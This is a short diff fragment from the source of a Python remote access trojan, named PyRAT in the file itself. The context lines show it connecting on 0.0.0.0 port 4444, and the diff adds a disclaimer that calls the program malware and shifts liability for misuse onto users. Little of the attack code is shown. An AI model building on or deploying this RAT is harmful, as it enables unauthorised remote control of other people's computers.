@@ -171,3 +171,9 @@ cmd> """.format(pyver,pycompiler,pybuild,pybranch)
 host = "0.0.0.0"
 port = 4444
 create_conn(host,port,ver)
+
+# Disclaimer
+# Usage of this malware (PyRAT) for attack targets without prior mutual consent is illegal. 
+# It is the end user's responsability to obey all applicable local, state, federal and 
+# international laws. Developer assume no liability and not responsible for any misuse or 
+# damage caused by this program.
